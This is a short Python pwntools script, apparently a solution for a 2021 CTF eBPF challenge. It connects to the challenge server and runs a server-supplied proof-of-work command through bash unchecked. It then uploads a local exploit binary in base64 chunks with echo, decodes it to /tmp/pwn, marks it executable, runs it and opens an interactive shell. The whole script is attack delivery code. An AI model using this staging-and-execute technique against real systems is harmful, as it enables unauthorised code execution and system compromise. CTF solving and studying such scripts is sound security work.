from pwn import *
import base64
import os


def send_cmd(cmd):
    r.sendlineafter("$", cmd)

#r = process("python3 run_qemu.py".split())

r = remote("ebpf.2021.ctfcompetition.com", 1337)
r.recvuntil(b"with:")
r.recvline()
cmd = r.recvline()
print(cmd)
s = process(["bash","-c",cmd])
s.recvline()
ans = s.recvline()
print(ans)
r.sendafter("?",ans)


iii = open("./exp", "rb").read()
b64 = base64.b64encode(iii).decode("utf-8")
now = 0
log.success("write base64 string to binary...")
seg = 500
while now < len(b64):
    cur = b64[now:now+seg:]
    cmd = "echo -ne \"{}\" >> /tmp/poc".format(cur)
    log.info("sending {} / {} ...".format(now+seg, len(b64)))
    send_cmd(cmd.encode("utf-8"))
    now += seg

log.success("base64 decoding...")
send_cmd(b"base64 -d /tmp/poc > /tmp/pwn")
send_cmd(b"chmod +x /tmp/pwn")
send_cmd(b"/tmp/pwn")
print(r.recvuntil("$"))
r.interactive()
